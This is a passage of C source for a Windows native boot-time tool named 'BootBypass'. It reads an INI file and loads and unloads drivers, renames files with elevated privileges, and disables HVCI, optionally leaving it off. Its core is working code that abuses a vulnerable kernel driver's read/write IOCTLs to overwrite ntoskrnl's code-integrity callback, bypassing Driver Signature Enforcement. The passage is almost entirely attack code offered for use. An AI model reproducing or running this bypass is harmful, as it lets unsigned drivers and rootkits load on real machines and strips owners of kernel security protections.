    packet.size = 4;

    status = NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                                  ioctl, &packet, sizeof(packet),
                                  &packet, sizeof(packet));

    if (!NT_SUCCESS(status))
        return FALSE;
    // Extract high DWORD (address + 4)
    high = packet.value;

    *value = ((ULONGLONG)high << 32) | (ULONGLONG)low;
    return TRUE;
}

// Query kernel base address from loaded module list
ULONGLONG GetNtoskrnlBase(void) {
    UCHAR stackBuffer[0x10000];
    ULONG returnLength;

    NTSTATUS status = NtQuerySystemInformation(11, stackBuffer, sizeof(stackBuffer), &returnLength);
    if (!NT_SUCCESS(status))
        return 0;

    SYSTEM_MODULE_INFORMATION* moduleInfo = (SYSTEM_MODULE_INFORMATION*)stackBuffer;
    if (moduleInfo->Count == 0)
        return 0;

    for (ULONG i = 0; i < moduleInfo->Count; i++) {
        char* imageName = moduleInfo->Modules[i].ImageName + moduleInfo->Modules[i].ModuleNameOffset;

        const char* ntName = "ntoskrnl.exe";
        BOOLEAN isNtoskrnl = TRUE;
        for (int j = 0; ntName[j] != 0; j++) {
            if (imageName[j] != ntName[j]) {
                isNtoskrnl = FALSE;
                break;
            }
        }

        if (isNtoskrnl)
            return (ULONGLONG)moduleInfo->Modules[i].ImageBase;
    }

    return 0;
}

// Open device handle to vulnerable kernel driver
HANDLE OpenDriverDevice(PCWSTR deviceName) {
    UNICODE_STRING usDeviceName;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hDevice = NULL;

    RtlInitUnicodeString(&usDeviceName, deviceName);
    InitializeObjectAttributes(&oa, &usDeviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = NtOpenFile(&hDevice, FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
                                &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);

    return NT_SUCCESS(status) ? hDevice : NULL;
}

// Patch Driver Signature Enforcement callback in kernel
NTSTATUS ExecutePatchDSE(PINI_ENTRY entry) {
    HANDLE hDriver = OpenDriverDevice(entry->DriverDevice);
    if (!hDriver) {
        DisplayMessage(L"FAILED: Cannot open driver device\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    ULONGLONG ntBase = GetNtoskrnlBase();
    if (ntBase == 0) {
        NtClose(hDriver);
        DisplayMessage(L"FAILED: Cannot find ntoskrnl\r\n");
        return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    ULONGLONG callbackToPatch = ntBase + entry->Offset_SeCiCallbacks + entry->Offset_Callback;
    ULONGLONG safeFunction = ntBase + entry->Offset_SafeFunction;

    ULONGLONG currentCallback = 0;
    if (!ReadMemory64(hDriver, callbackToPatch, &currentCallback, entry->IoControlCode_Read)) {
        NtClose(hDriver);
        DisplayMessage(L"FAILED: Cannot read current callback\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    if (currentCallback == safeFunction) {
        NtClose(hDriver);
        DisplayMessage(L"INFO: DSE already patched, skipping\r\n");
        return STATUS_SUCCESS;
    }

    // Store original callback before patching
    g_OriginalCallback = currentCallback;
    SaveStateSection(currentCallback);
    DisplayMessage(L"INFO: Original callback saved\r\n");

    if (WriteMemory64(hDriver, callbackToPatch, safeFunction, entry->IoControlCode_Write)) {
        NtClose(hDriver);
        DisplayMessage(L"SUCCESS: DSE patched\r\n");
        return STATUS_SUCCESS;
    } else {
        NtClose(hDriver);
        DisplayMessage(L"FAILED: DSE patch write failed\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }
}

// Restore original DSE callback from saved state
NTSTATUS ExecuteUnpatchDSE(PINI_ENTRY entry) {
    if (g_OriginalCallback == 0) {
        if (!LoadStateSection(&g_OriginalCallback)) {
            DisplayMessage(L"WARNING: No original callback stored, skipping unpatch\r\n");
            return STATUS_SUCCESS;
        }
    }

    WCHAR msgBuf[128];
    wcscpy(msgBuf, L"INFO: Callback to restore: ");
    WCHAR hexBuf[32];
    ULONGLONGToHexString(g_OriginalCallback, hexBuf, TRUE);
    wcscat(msgBuf, hexBuf);
    wcscat(msgBuf, L"\r\n");
    DisplayMessage(msgBuf);

    HANDLE hDriver = OpenDriverDevice(entry->DriverDevice);
    if (!hDriver) {
        DisplayMessage(L"FAILED: Cannot open driver device for unpatch\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    ULONGLONG ntBase = GetNtoskrnlBase();
    if (ntBase == 0) {
        NtClose(hDriver);
        DisplayMessage(L"FAILED: Cannot find ntoskrnl\r\n");
        return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    ULONGLONG callbackToRestore = ntBase + entry->Offset_SeCiCallbacks + entry->Offset_Callback;
    ULONGLONG safeFunction = ntBase + entry->Offset_SafeFunction;

    ULONGLONG currentCallback = 0;
    if (!ReadMemory64(hDriver, callbackToRestore, &currentCallback, entry->IoControlCode_Read)) {
        NtClose(hDriver);
        DisplayMessage(L"FAILED: Cannot read current callback\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    if (currentCallback == g_OriginalCallback) {
        NtClose(hDriver);
        DisplayMessage(L"INFO: DSE already restored, skipping\r\n");
        RemoveStateSection();
        return STATUS_SUCCESS;
    }

    if (currentCallback != safeFunction) {
        DisplayMessage(L"WARNING: Callback state unexpected\r\n");
    }

    if (WriteMemory64(hDriver, callbackToRestore, g_OriginalCallback, entry->IoControlCode_Write)) {
        NtClose(hDriver);
        DisplayMessage(L"SUCCESS: DSE unpatched (original restored)\r\n");
        g_OriginalCallback = 0;
        RemoveStateSection();
        return STATUS_SUCCESS;
    } else {
        NtClose(hDriver);
        DisplayMessage(L"FAILED: DSE unpatch write failed\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }
}

// ============================================================================
// FILE RENAME OPERATIONS - Privileged file system modifications
// ============================================================================

// Perform privileged file rename operation
NTSTATUS ExecuteRename(PINI_ENTRY entry) {
    UNICODE_STRING usSourcePath, usTargetPath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    UCHAR buffer[512];
    PFILE_RENAME_INFORMATION pRename = (PFILE_RENAME_INFORMATION)buffer;
    ULONG i;

    RtlInitUnicodeString(&usSourcePath, entry->SourcePath);
    RtlInitUnicodeString(&usTargetPath, entry->TargetPath);

    // Check if target file already exists (operation already completed)
    InitializeObjectAttributes(&oa, &usTargetPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    status = NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb,
                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                       FILE_SYNCHRONOUS_IO_NONALERT);

    if (NT_SUCCESS(status)) {
        NtClose(hFile);

        // Target exists, check if source still exists
        InitializeObjectAttributes(&oa, &usSourcePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
        status = NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           FILE_SYNCHRONOUS_IO_NONALERT);

        if (!NT_SUCCESS(status)) {
            // Target exists and source doesn't - rename already done
            DisplayMessage(L"SKIPPED: Rename already completed\r\n");
            return STATUS_SUCCESS;
        }
        NtClose(hFile);
    }

    // Proceed with rename operation
    InitializeObjectAttributes(&oa, &usSourcePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = NtOpenFile(&hFile, DELETE | SYNCHRONIZE, &oa, &iosb,
                       FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                       FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot open source file\r\n");
        DisplayStatus(status);
        return status;
    }

    // Zero-initialize buffer before use
    memset_impl(buffer, 0, sizeof(FILE_RENAME_INFORMATION) + usTargetPath.Length);

    pRename->ReplaceIfExists = entry->ReplaceIfExists ? 1 : 0;
    pRename->RootDirectory = NULL;
    // Set target filename length for rename operation
    pRename->FileNameLength = usTargetPath.Length;

    for (i = 0; i < (ULONG)usTargetPath.Length / sizeof(WCHAR); i++)
        pRename->FileName[i] = usTargetPath.Buffer[i];

    // Subtract 2 bytes - FileName[1] already allocates space for one WCHAR
    status = NtSetInformationFile(hFile, &iosb, pRename,
                                 // Subtract 2 bytes due to FileName[1] in structure definition
                                 sizeof(FILE_RENAME_INFORMATION) + usTargetPath.Length - 2,
                                 10);
    NtClose(hFile);

    if (NT_SUCCESS(status)) {
        DisplayMessage(L"SUCCESS: File renamed\r\n");
    } else {
        DisplayMessage(L"FAILED: Rename operation failed\r\n");
        DisplayStatus(status);
    }

    return status;
}

// ============================================================================
// INI PARSER - Updated with [Config] section support
// ============================================================================

ULONG ParseIniFile(PWSTR iniContent, PINI_ENTRY entries, ULONG maxEntries, PCONFIG_SETTINGS config) {
    ULONG entryCount = 0;
    PWSTR line = iniContent, nextLine;
    WCHAR lineBuf[MAX_PATH_LEN];
    ULONG i;
    int currentEntry = -1;
    BOOLEAN inConfigSection = FALSE;

    // Initialize config with defaults
    config->RestoreHVCI = TRUE; // Default: restore HVCI

    if (!iniContent || iniContent[0] == 0)
        return 0;

    if (iniContent[0] == 0xFEFF) {
        line++;
    }

    while (*line && entryCount < maxEntries) {
        nextLine = line;
        while (*nextLine && *nextLine != L'\r' && *nextLine != L'\n')
            nextLine++;

        i = 0;
        while (line < nextLine && i < (MAX_PATH_LEN - 1))
            lineBuf[i++] = *line++;
        lineBuf[i] = 0;

        line = nextLine;
        if (*line == L'\r')
            line++;
        if (*line == L'\n')
            line++;

        TrimString(lineBuf);
        if (lineBuf[0] == 0 || lineBuf[0] == L';' || lineBuf[0] == L'#')
            continue;

        if (lineBuf[0] == L'[') {
            // Check for [Config] section
            if (_wcsicmp_impl(lineBuf, L"[Config]") == 0) {
                inConfigSection = TRUE;
                currentEntry = -1;
                continue;
            }

            // Skip [DSE_STATE] section
            if (_wcsicmp_impl(lineBuf, L"[DSE_STATE]") == 0) {
                inConfigSection = FALSE;
                currentEntry = -1;
                continue;
            }

            // Regular entry section
            inConfigSection = FALSE;

            if (currentEntry >= 0) {
                if (entries[currentEntry].DisplayName[0] == 0 && entries[currentEntry].ServiceName[0]) {
                    wcscpy(entries[currentEntry].DisplayName, entries[currentEntry].ServiceName);
                }
                entryCount++;
            }

            if (entryCount < maxEntries) {
                currentEntry = (LONG)entryCount;

                memset_impl(&entries[currentEntry], 0, sizeof(INI_ENTRY));
                wcscpy(entries[currentEntry].DriverType, L"KERNEL");
                wcscpy(entries[currentEntry].StartType, L"DEMAND");
                entries[currentEntry].CheckIfLoaded = FALSE;
                entries[currentEntry].ReplaceIfExists = FALSE;
            } else {
                currentEntry = -1;
            }
            continue;
        }

        // Parse config section
        if (inConfigSection && lineBuf[0] != 0) {
            PWSTR equals = lineBuf;
            while (*equals && *equals != L'=')
                equals++;

            if (*equals == L'=') {
                *equals = 0;
                PWSTR key = lineBuf, value = equals + 1;
                TrimString(key);
                TrimString(value);

                if (_wcsicmp_impl(key, L"RestoreHVCI") == 0) {
                    config->RestoreHVCI = (_wcsicmp_impl(value, L"YES") == 0 ||
                                          _wcsicmp_impl(value, L"TRUE") == 0 ||
                                          _wcsicmp_impl(value, L"1") == 0);
                }
            }
            continue;
        }

        // Parse regular entry section
        if (currentEntry >= 0 && (ULONG)currentEntry < maxEntries) {
            PWSTR equals = lineBuf;
            while (*equals && *equals != L'=')
                equals++;

            if (*equals == L'=') {
                *equals = 0;
                PWSTR key = lineBuf, value = equals + 1;
                TrimString(key);
                TrimString(value);

                if (_wcsicmp_impl(key, L"Action") == 0) {
                    if (_wcsicmp_impl(value, L"LOAD") == 0) {
                        entries[currentEntry].Action = ACTION_LOAD;
                    } else if (_wcsicmp_impl(value, L"UNLOAD") == 0) {
                        entries[currentEntry].Action = ACTION_UNLOAD;
                    } else if (_wcsicmp_impl(value, L"PATCH_DSE") == 0) {
                        entries[currentEntry].Action = ACTION_PATCH_DSE;
                        wcscpy(entries[currentEntry].ServiceName, L"PATCH_DSE");
                    } else if (_wcsicmp_impl(value, L"UNPATCH_DSE") == 0) {
                        entries[currentEntry].Action = ACTION_UNPATCH_DSE;
                        wcscpy(entries[currentEntry].ServiceName, L"UNPATCH_DSE");
                    } else if (_wcsicmp_impl(value, L"RENAME") == 0) {
                        entries[currentEntry].Action = ACTION_RENAME;
                    }
                } else if (_wcsicmp_impl(key, L"ServiceName") == 0) {
                    wcscpy(entries[currentEntry].ServiceName, value);
                } else if (_wcsicmp_impl(key, L"DisplayName") == 0) {
                    wcscpy(entries[currentEntry].DisplayName, value);
                } else if (_wcsicmp_impl(key, L"ImagePath") == 0) {
                    wcscpy(entries[currentEntry].ImagePath, value);
                } else if (_wcsicmp_impl(key, L"Type") == 0) {
                    wcscpy(entries[currentEntry].DriverType, value);
                } else if (_wcsicmp_impl(key, L"StartType") == 0) {
                    wcscpy(entries[currentEntry].StartType, value);
                } else if (_wcsicmp_impl(key, L"CheckIfLoaded") == 0) {
                    entries[currentEntry].CheckIfLoaded = (_wcsicmp_impl(value, L"YES") == 0 || _wcsicmp_impl(value, L"TRUE") == 0);
                } else if (_wcsicmp_impl(key, L"DriverDevice") == 0) {
                    wcscpy(entries[currentEntry].DriverDevice, value);
                } else if (_wcsicmp_impl(key, L"IoControlCode_Read") == 0) {
                    StringToULONG(value, &entries[currentEntry].IoControlCode_Read);
                } else if (_wcsicmp_impl(key, L"IoControlCode_Write") == 0) {
                    StringToULONG(value, &entries[currentEntry].IoControlCode_Write);
                } else if (_wcsicmp_impl(key, L"TargetModule") == 0) {
                    wcscpy(entries[currentEntry].TargetModule, value);
                } else if (_wcsicmp_impl(key, L"Offset_SeCiCallbacks") == 0) {
                    StringToULONGLONG(value, &entries[currentEntry].Offset_SeCiCallbacks);
                } else if (_wcsicmp_impl(key, L"Offset_Callback") == 0) {
                    StringToULONGLONG(value, &entries[currentEntry].Offset_Callback);
                } else if (_wcsicmp_impl(key, L"Offset_SafeFunction") == 0) {
                    StringToULONGLONG(value, &entries[currentEntry].Offset_SafeFunction);
                } else if (_wcsicmp_impl(key, L"SourcePath") == 0) {
                    wcscpy(entries[currentEntry].SourcePath, value);
                } else if (_wcsicmp_impl(key, L"TargetPath") == 0) {
                    wcscpy(entries[currentEntry].TargetPath, value);
                } else if (_wcsicmp_impl(key, L"ReplaceIfExists") == 0) {
                    entries[currentEntry].ReplaceIfExists = (_wcsicmp_impl(value, L"YES") == 0 || _wcsicmp_impl(value, L"TRUE") == 0);
                }
            }
        }
    }

    if (currentEntry >= 0 && (ULONG)currentEntry < maxEntries) {
        if (entries[currentEntry].DisplayName[0] == 0 && entries[currentEntry].ServiceName[0]) {
            wcscpy(entries[currentEntry].DisplayName, entries[currentEntry].ServiceName);
        }
        entryCount++;
    }

    return entryCount;
}

// ============================================================================
// MAIN ENTRY POINT - Native application startup and orchestration
// ============================================================================

__declspec(noreturn) void __stdcall NtProcessStartup(void* Peb) {
    INI_ENTRY entries[MAX_ENTRIES];
    CONFIG_SETTINGS config;
    ULONG entryCount, i;
    PWSTR iniContent = NULL;
    NTSTATUS status;
    BOOLEAN bOld;
    BOOLEAN skipPatch;

    // Elevate process privileges for driver/registry operations
    RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &bOld);
    // Elevate process privileges for driver/registry operations
    RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, &bOld);
    // Elevate process privileges for driver/registry operations
    RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &bOld);

    DisplayMessage(L"BootBypass - Driver/Patch/Rename Manager\r\n");
    DisplayMessage(L"====================================\r\n");

    // Cleanup after reboot - remove Themes dependency and RebootGuardian service
    RemoveThemesDependency();
    RemoveRebootGuardianService();

    // Check HVCI status and schedule reboot if needed
    skipPatch = CheckAndDisableHVCI();

    if (!ReadIniFile(L"\\??\\C:\\Windows\\drivers.ini", &iniContent)) {
        DisplayMessage(L"ERROR: Cannot read drivers.ini\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    entryCount = ParseIniFile(iniContent, entries, MAX_ENTRIES, &config);

    if (entryCount == 0) {
        DisplayMessage(L"ERROR: No valid entries found in INI\r\n");
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

    // Display config status
    DisplayMessage(L"CONFIG: RestoreHVCI=");
    DisplayMessage(config.RestoreHVCI ? L"YES\r\n" : L"NO\r\n");

    if (g_OriginalCallback == 0) {
        LoadStateSection(&g_OriginalCallback);
    }

    // Process all INI entries in sequential order
    for (i = 0; i < entryCount; i++) {
        if (entries[i].ServiceName[0] == 0 && entries[i].DisplayName[0] == 0) {
            continue;
        }
        if (_wcsicmp_impl(entries[i].ServiceName, L"DSE_STATE") == 0 ||
            _wcsicmp_impl(entries[i].DisplayName, L"DSE_STATE") == 0) {
            continue;
        }

        DisplayMessage(L"\r\n[");
        DisplayMessage(entries[i].DisplayName[0] ? entries[i].DisplayName : entries[i].ServiceName);
        DisplayMessage(L"]\r\n");

        // Skip DSE operations if waiting for HVCI reboot
        if (skipPatch && (entries[i].Action == ACTION_PATCH_DSE ||
                          entries[i].Action == ACTION_UNPATCH_DSE)) {
            DisplayMessage(L"SKIPPED: Waiting for reboot\r\n");
            continue;
        }

        if (entries[i].Action == ACTION_LOAD) {
            if (entries[i].CheckIfLoaded && IsDriverLoaded(entries[i].ServiceName)) {
                DisplayMessage(L"SKIPPED: Already loaded\r\n");
            } else {
                status = LoadDriver(entries[i].ServiceName, entries[i].ImagePath,
                                  entries[i].DriverType, entries[i].StartType);

                if (NT_SUCCESS(status)) {
                    DisplayMessage(L"SUCCESS: Driver loaded\r\n");
                } else if (status == STATUS_IMAGE_ALREADY_LOADED) {
                    DisplayMessage(L"SUCCESS: Already loaded\r\n");
                } else {
                    DisplayMessage(L"FAILED: Load failed");
                    DisplayStatus(status);
                }
            }
        } else if (entries[i].Action == ACTION_UNLOAD) {
            if (!IsDriverLoaded(entries[i].ServiceName)) {
                DisplayMessage(L"SKIPPED: Not loaded\r\n");
            } else {
                status = UnloadDriver(entries[i].ServiceName);

                if (NT_SUCCESS(status)) {
                    DisplayMessage(L"SUCCESS: Driver unloaded\r\n");
                } else {
                    DisplayMessage(L"FAILED: Unload failed");
                    DisplayStatus(status);
                }
            }
        } else if (entries[i].Action == ACTION_PATCH_DSE) {
            status = ExecutePatchDSE(&entries[i]);
            if (!NT_SUCCESS(status)) {
                DisplayMessage(L"WARNING: Patch failed, continuing...\r\n");
            }
        } else if (entries[i].Action == ACTION_UNPATCH_DSE) {
            status = ExecuteUnpatchDSE(&entries[i]);
            if (!NT_SUCCESS(status)) {
                DisplayMessage(L"WARNING: Unpatch failed, continuing...\r\n");
            }
        } else if (entries[i].Action == ACTION_RENAME) {
            status = ExecuteRename(&entries[i]);
            if (!NT_SUCCESS(status)) {
                DisplayMessage(L"WARNING: Rename failed, continuing...\r\n");
            }
        } else {
            DisplayMessage(L"ERROR: Unknown action type\r\n");
        }
    }

    DisplayMessage(L"\r\n====================================\r\n");

    // Conditionally restore HVCI based on config
    if (!skipPatch) {
        if (config.RestoreHVCI) {
            RestoreHVCI();
            DisplayMessage(L"All operations completed - HVCI restored.\r\n");
        } else {
            DisplayMessage(L"All operations completed - HVCI left disabled.\r\n");
        }
    } else {
        DisplayMessage(L"Operations skipped - waiting for reboot.\r\n");
    }

    NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    __assume(0);
}